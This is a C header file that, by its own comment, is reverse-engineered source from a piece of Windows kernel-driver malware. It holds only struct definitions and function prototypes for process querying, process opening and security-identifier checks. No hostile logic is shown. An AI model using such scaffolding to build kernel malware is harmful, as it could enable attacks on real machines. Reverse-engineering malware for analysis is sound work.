/*
 _   __ _____ _____  _    _ _   _
| | / /|  ___|  _  || |  | | | | |
| |/ / | |__ | | | || |  | | | | |
|    \ |  __|| | | || |/\| | | | |
| |\  \| |___\ \_/ /\  /\  / |_| |
\_| \_/\____/ \___/  \/  \/ \___/
                            2023
Copyright (c) Fluxuss Cyber Tech Desenvolvimento de Software, SLU (FLUXUSS)
Copyright (c) Fluxuss Software Security, LLC

! Reversed Soruce code from the original malware and maybe not equivalent the original source code.
*/

#include <ntifs.h>


typedef struct _SYSTEM_THREADS {

    LARGE_INTEGER  KernelTime;
    LARGE_INTEGER  UserTime;
    LARGE_INTEGER  CreateTime;
    ULONG          WaitTime;
    PVOID          StartAddress;
    CLIENT_ID      ClientId;
    KPRIORITY      Priority;
    KPRIORITY      BasePriority;
    ULONG          ContextSwitchCount;
    LONG           State;
    LONG           WaitReason;

} SYSTEM_THREADS, * PSYSTEM_THREADS;

typedef struct _SYSTEM_PROCESSES {

    ULONG            NextEntryDelta;
    ULONG            ThreadCount;
    ULONG            Reserved1[6];
    LARGE_INTEGER    CreateTime;
    LARGE_INTEGER    UserTime;
    LARGE_INTEGER    KernelTime;
    UNICODE_STRING   ProcessName;
    KPRIORITY        BasePriority;
    SIZE_T           ProcessId;
    SIZE_T           InheritedFromProcessId;
    ULONG            HandleCount;
    ULONG            Reserved2[2];
    VM_COUNTERS      VmCounters;
    IO_COUNTERS      IoCounters;
    SYSTEM_THREADS   Threads[1];

} SYSTEM_PROCESSES, * PSYSTEM_PROCESSES;

#define SystemInformationClass_FLAG 5
#define SystemModuleInformation 0x0B
#define TokenUser 1

typedef NTSTATUS ( *QUERY_INFO_PROCESS ) (

    __in HANDLE ProcessHandle,
    __in PROCESSINFOCLASS ProcessInformationClass,
    __out_bcount(ProcessInformationLength) PVOID ProcessInformation,
    __in ULONG ProcessInformationLength,
    __out_opt PULONG ReturnLength
    
);

QUERY_INFO_PROCESS ZwQueryInformationProcess;

NTSTATUS NTAPI ZwQuerySystemInformation(
    
    _In_ ULONG SystemInformationClass,
    _Inout_ PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength

);

BOOLEAN CheckProcess64(
    
    _In_ HANDLE hProc

);

BOOLEAN ExecuteCheckingSecurityIdentifiers(
    
    _In_ PEPROCESS* peProcess,
    _In_ UNICODE_STRING* unicodePermission

);

BOOLEAN CheckAdjustSecurityIdentifiers(
    
    _In_ PEPROCESS* peProcess

);

BOOLEAN CompareString(
    
    _In_ WCHAR* stringToCompare,
    _In_ WCHAR* StringToFind

);

size_t MoveArgumentToStackAndMoveBackToEaxRegister(
    
    _In_ size_t p1

);

NTSTATUS OpenTargetProcess(
    
    _In_ SIZE_T* pPID

);